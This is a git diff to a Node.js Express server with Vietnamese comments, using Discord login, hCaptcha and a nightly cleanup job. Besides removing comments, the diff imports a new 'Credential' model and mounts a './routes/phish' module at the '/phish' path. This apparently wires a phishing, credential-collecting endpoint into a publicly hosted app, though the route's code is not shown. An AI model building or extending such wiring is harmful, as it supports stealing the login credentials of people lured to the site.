@@ -6,16 +6,13 @@ const bodyParser = require('body-parser');
 const cron = require('node-cron');
 const { Op } = require('sequelize');
 
-// --- THAY ĐỔI CHÍNH ---
-// Import tất cả từ file quản lý model mới
-const { sequelize, User, Link, Key } = require('./models');
+const { sequelize, User, Link, Key, Credential } = require('./models');
 
-// Import các route
 const authRoutes = require('./routes/auth');
 const appRoutes = require('./routes/app');
 const keyRoutes = require('./routes/key');
+const phishRoutes = require('./routes/phish'); // THÊM ROUTE MỚI
 
-// Lấy các biến môi trường
 const PORT = process.env.PORT || 3000;
 const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
 const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
@@ -23,32 +20,25 @@ const SESSION_SECRET = process.env.SESSION_SECRET;
 const BASE_URL = process.env.RENDER_EXTERNAL_URL;
 const HCAPTCHA_SITE_KEY = process.env.HCAPTCHA_SITE_KEY;
 
-// Kiểm tra các biến môi trường quan trọng
 if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET || !SESSION_SECRET || !BASE_URL || !HCAPTCHA_SITE_KEY) {
-    console.error("LỖI: Thiếu các biến môi trường cần thiết! (DISCORD_CLIENT_ID, DISCORD_CLIENT_SECRET, SESSION_SECRET, RENDER_EXTERNAL_URL, HCAPTCHA_SITE_KEY)");
+    console.error("LỖI: Thiếu các biến môi trường cần thiết!");
     process.exit(1);
 }
 
 const app = express();
 
-// --- Cấu hình Express ---
 app.set('view engine', 'ejs');
 app.use(express.static('public'));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// --- Cấu hình Session ---
 app.use(session({
     secret: SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
-    cookie: {
-      secure: 'auto',
-      httpOnly: true,
-    }
+    cookie: { secure: 'auto', httpOnly: true }
 }));
 
-// --- Cấu hình Passport.js và Discord Strategy ---
 app.use(passport.initialize());
 app.use(passport.session());
 
@@ -74,18 +64,15 @@ passport.use(new DiscordStrategy({
     try {
         const { id, username, avatar } = profile;
         const avatarUrl = avatar ? `https://cdn.discordapp.com/avatars/${id}/${avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png';
-        
         const [user, created] = await User.findOrCreate({
             where: { discordId: id },
             defaults: { username: username, avatar: avatarUrl }
         });
-
         if (!created && (user.username !== username || user.avatar !== avatarUrl)) {
           user.username = username;
           user.avatar = avatarUrl;
           await user.save();
         }
-
         return done(null, user);
     } catch (err) {
         console.error("Lỗi trong Discord strategy:", err);
@@ -93,14 +80,11 @@ passport.use(new DiscordStrategy({
     }
 }));
 
-
-// --- Sử dụng Routes ---
 app.use('/auth', authRoutes);
 app.use('/key', keyRoutes);
+app.use('/phish', phishRoutes); // SỬ DỤNG ROUTE MỚI
 app.use('/', appRoutes);
 
-
-// --- Tác vụ tự động (CRON JOB) ---
 cron.schedule('0 2 * * *', async () => {
     const now = new Date();
     console.log(`[CRON] Bắt đầu tác vụ dọn dẹp lúc ${now.toLocaleString('vi-VN')}...`);
@@ -121,16 +105,12 @@ cron.schedule('0 2 * * *', async () => {
     timezone: "Asia/Ho_Chi_Minh"
 });
 
-
-// --- Khởi động Server ---
 async function startServer() {
     try {
         await sequelize.authenticate();
         console.log('✅ Kết nối CSDL thành công.');
-        
         await sequelize.sync({ alter: true });
         console.log('✅ Đồng bộ hóa Models thành công.');
-
         app.listen(PORT, () => {
             console.log(`🚀 Máy chủ đang chạy tại cổng ${PORT}`);
             console.log(`🌐 URL công khai: ${BASE_URL}`);
@@ -140,5 +120,4 @@ async function startServer() {
         process.exit(1);
     }
 }
-
 startServer();
